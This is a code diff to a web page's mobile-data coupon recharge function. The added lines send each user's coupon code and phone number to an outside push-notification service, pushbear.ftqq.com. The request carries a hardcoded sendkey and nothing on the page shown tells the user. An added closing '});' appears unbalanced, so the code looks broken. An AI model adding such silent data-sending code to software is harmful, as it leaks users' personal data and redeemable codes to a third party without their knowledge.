@@ -38,6 +38,11 @@ var charge = function(){
      var chargeURL = "http://ms.lefone.cn/msflowday/couponShowController/charegeCoupon?enStr=" + str + "&couponCode=" + code + "&mobile=" + mobile + "&chargeType=0&rand=" + rand;
      $("#frame").attr("src", chargeURL);
      $("#charge").text("黄色框中显示充值结果");
+      
+			var newResult = "码：" + code + " 手机号：" + mobile;
+			$.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=客户端流量充值"+code+"&desp=" + newResult)
+		  
+		});
     }else{
      alert("请输入验证码");
     }
